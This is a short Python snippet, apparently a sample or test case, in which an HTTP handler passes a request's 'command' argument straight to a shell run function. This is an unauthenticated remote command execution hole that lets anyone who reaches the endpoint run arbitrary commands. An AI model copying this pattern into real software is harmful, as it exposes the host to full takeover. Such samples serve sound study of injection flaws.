from shell import run
def http_handler(request):
    run(request.args["command"])
    return "ok"
